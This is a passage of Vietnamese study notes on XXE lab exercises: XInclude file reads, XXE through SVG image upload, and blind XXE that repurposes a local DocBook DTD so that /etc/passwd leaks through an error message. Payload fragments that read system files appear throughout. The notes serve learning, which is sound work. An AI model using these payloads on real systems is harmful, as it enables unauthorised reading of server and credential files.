- `xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)"`: Khai báo namespace cho XInclude để Parser hiểu được các thẻ `xi:`.
- `<xi:include ... />`: Thẻ thực hiện việc nhúng.
- `parse="text"`: Yêu cầu Parser coi nội dung file là văn bản thuần túy (tránh lỗi nếu file chứa các ký tự đặc biệt của XML).
- `href="file:///etc/passwd"`: Đường dẫn đến file cần đọc.

## Exploiting XXE via image file upload
-ở bài lab này, server sử dụng các thư viện như **Apache Batik** để xử lý ảnh vector (SVG), hoàn toàn có thể khai thác XXE vì bản chất của SVG chính là XML.

Tệp **SVG (Scalable Vector Graphics)** thực chất là một tài liệu XML dùng để mô tả hình ảnh. Khi bạn upload một file SVG, server sẽ sử dụng một thư viện XML Parser để "đọc" file đó và render thành ảnh (hoặc resize).
- **Khai thác:** Nếu thư viện này cho phép các thực thể bên ngoài (external entities), bạn có thể chèn payload XXE vào trong cấu trúc file SVG.
- **Kết quả:** Khi server render ảnh, nó sẽ thực thi thực thể đó và vẽ nội dung file (ví dụ: `/etc/passwd`) lên chính bức ảnh mà bạn có thể xem được

- dùng notepab để tạo nhanh 1 file .svg với script bài lab cấp
- upload ảnh kèm comment vào 1 bài viết
![[Pasted image 20260502181945.png]]
![[Pasted image 20260502181954.png]]

## Exploiting XXE to retrieve data by repurposing a local DTD
- ở bài lab này, **Server bị "mù" hoàn toàn (Blind XXE):** Không trả về lỗi hay dữ liệu trong Response, **Server bị chặn kết nối ra ngoài (Out-of-band bị chặn):** không thể gọi tới Burp Collaborator hay Exploit Server để tải file DTD bên ngoài.

Lúc này, chúng ta sẽ sử dụng một kỹ thuật gọi là **DTD Repurposing** 

Mọi hệ thống (Linux, Windows) hoặc các ứng dụng lớn thường có sẵn các file DTD mặc định để cấu hình hệ thống.
- **Ý tưởng:** Chúng ta sẽ tìm một file DTD có sẵn trên server (Local DTD), sau đó "ghi đè" (override) một thực thể bên trong đó để tạo ra thông báo lỗi chứa dữ liệu => Vì chúng ta không tải file từ bên ngoài, mọi thứ đều diễn ra nội bộ trên server nên tường lửa không thể chặn.

![[Pasted image 20260502182352.png]]

### Payload

**Gọi File DTD "mồi"**
`<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">`
- Dòng này khai báo thực thể tham số `%local_dtd` trỏ đến một file DTD có thật trên hệ thống Linux (thường đi kèm với trình xem trợ giúp Yelp).
- Mục đích: Chúng ta cần một file DTD ngoại vi nhưng phải nằm **nội bộ** trên server để lách luật chặn kết nối internet.
    

**Ghi đè thực thể `ISOamso`**

`<!ENTITY % ISOamso ' ... '>`
- Trong file `docbookx.dtd` gốc, có một thực thể tên là `ISOamso`.
- XML cho phép bạn định nghĩa lại (redefine) một thực thể nếu bạn khai báo nó **trước** khi file DTD gốc được load. Khi Parser đọc đến file gốc, nó sẽ bỏ qua định nghĩa cũ và dùng cái "độc hại" vừa cấp
    

**Chuỗi phản ứng bên trong `ISOamso`**


1. `<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">`:
    - `&#x25;` chính là dấu `%`. Chúng ta phải mã hóa nó vì đây là thực thể nằm trong thực thể.
    - Dòng này đơn giản là đọc file `/etc/passwd`.
2. `<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">`:
    - Đây là thực thể lồng 3 lớp. Nó tạo ra một thực thể tên là `%error`.
    - `&#x26;#x25;` là mã hóa kép của dấu `%`.
    - Nó tạo ra một đường dẫn file "ma": `/nonexistent/` + `nội_dung_file_passwd`.
3. `&#x25;eval;` và `&#x25;error;`:
    - Kích hoạt việc giải mã và thực thi các thực thể trên.
        
**Thực thi tổng lực**

`%local_dtd;`
- Cuối cùng,  gọi `%local_dtd;`. Lúc này Parser mới thực sự mở file `docbookx.dtd` ra, thấy thực thể `ISOamso` đã bị bạn "chiếm quyền" và thực thi toàn bộ chuỗi lệnh độc hại bên trong.


nó lại hiện ra file `/etc/passwd`?
Khi Parser cố gắng xử lý thực thể `%error`, nó sẽ tìm file tại: `file:///nonexistent/root:x:0:0:root:/root:/bin/bash...`
Vì thư mục `/nonexistent/` không tồn tại, Server sẽ văng ra một lỗi **FileNotFoundException**. Trong thông báo lỗi đó, nó sẽ in luôn cái đường dẫn mà nó không tìm thấy. Và thế là xong, nội dung `/etc/passwd` hiện ra "nguyên hình" trong thông báo lỗi trả về

